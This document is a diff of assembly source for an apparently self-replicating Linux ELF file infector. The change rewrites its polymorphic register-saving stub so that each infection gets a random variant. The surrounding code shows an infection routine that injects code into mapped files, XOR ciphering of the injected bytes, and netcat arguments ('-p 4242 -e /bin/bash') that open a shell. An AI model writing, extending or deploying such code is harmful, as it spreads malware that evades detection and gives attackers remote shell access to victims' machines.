@@ -9,18 +9,44 @@ _start:
 
 begin:
 	; save all registers
-POLY_push_regs_begin:
-	push rax
-POLY_push_regs_end:
-	push rdi
-	push rsi
-	push rdx
-	push rcx
-	push rbx
-	push r8
-	push r9
-	push r10
+POLY_save_register_begin:
 	push r11
+	push rax
+	pop r11
+	pop rax
+
+	push r10
+	push rdi
+	pop r10
+	pop rdi
+
+	push r9
+	push rsi
+	pop r9
+	pop rsi
+
+	push r8
+	push rdx
+	pop r8
+	pop rdx
+
+	push rbx
+	push rcx
+	pop rbx
+	pop rcx
+
+	sub rsp, 80
+	mov [rsp + 32], rcx
+	mov [rsp + 48], r8
+	mov [rsp + 8], rdi
+	mov [rsp + 16], rsi
+	mov [rsp + 40], rbx
+	mov [rsp + 56], r9
+	mov [rsp], rax
+	mov [rsp + 24], rdx
+	mov [rsp + 72], r11
+	mov [rsp + 64], r10
+POLY_save_register_end:
 
 	; uncipher first part of the code
 	lea rdi, [rel program_entry]			; data = &program_entry
@@ -525,9 +551,9 @@ nc_arg3: db "-p", 0
 nc_arg4: db "4242", 0
 nc_arg5: db "-e", 0
 nc_arg6: db "/bin/bash", 0
-poly_push_regs_buffer: db 0x00				; Will be replaced by a script
-poly_push_regs_size: dq 0				; Will be replaced by a script
-poly_push_regs_count: dq 0				; Will be replaced by a script
+poly_save_register_buffer: db 0x00			; Will be replaced by a script
+poly_save_register_size: dq 0				; Will be replaced by a script
+poly_save_register_count: dq 0				; Will be replaced by a script
 ; END FAKE .data SECTION
 
 ; void infection_routine(long _compressed_data_size, uint8_t *_real_begin_compressed_data_ptr)
@@ -1000,19 +1026,19 @@ treat_file:
 	add rdi, key_size - _start			; 	+ (key_size - _start)
 	mov qword [rdi], KEY_BYTE_SIZE			; *_key_size_ptr = KEY_BYTE_SIZE;
 
-	; replace injected push_regs by a random poly_push_regs
-	mov rdi, [rand_buffer]				; variation_ptr = get_variation_ptr(rand_buffer, rand_index, poly_push_regs_count, poly_push_regs_size, poly_push_regs_buffer);
+	; replace injected save_register by a random poly_save_register
+	mov rdi, [rand_buffer]				; variation_ptr = get_variation_ptr(rand_buffer, rand_index, poly_save_register_count, poly_save_register_size, poly_save_register_buffer);
 	mov rsi, [rand_index]				; ...
-	mov rdx, [rel poly_push_regs_count]			; ...
-	mov rcx, [rel poly_push_regs_size]			; ...
-	lea r8, [rel poly_push_regs_buffer]			; ...
+	mov rdx, [rel poly_save_register_count]		; ...
+	mov rcx, [rel poly_save_register_size]		; ...
+	lea r8, [rel poly_save_register_buffer]		; ...
 	call get_variation_ptr				; ...
 	mov rsi, rax					; ...
-	mov rdi, [mappedfile]				; _poly_push_regs_ptr = file_map
+	mov rdi, [mappedfile]				; _poly_save_register_ptr = file_map
 	add rdi, [filesize]				; 	+ filesize
-	add rdi, POLY_push_regs_begin - _start		; 	+ (.POLY_push_regs_begin - _start)
-	mov rcx, [rel poly_push_regs_size]		; _poly_push_regs_size = poly_push_regs_size;
-	rep movsb					; memcpy(_poly_push_regs_ptr, variation_ptr, _poly_push_regs_size);
+	add rdi, POLY_save_register_begin - _start	; 	+ (.POLY_save_register_begin - _start)
+	mov rcx, [rel poly_save_register_size]		; _poly_save_register_size = poly_save_register_size;
+	rep movsb					; memcpy(_poly_save_register_ptr, variation_ptr, _poly_save_register_size);
 
 	; xor cipher all injected bytes between obfuscation_begin and _end
 	mov rdi, [mappedfile]				; data = file_map + filesize + (obfuscation_begin - _start);
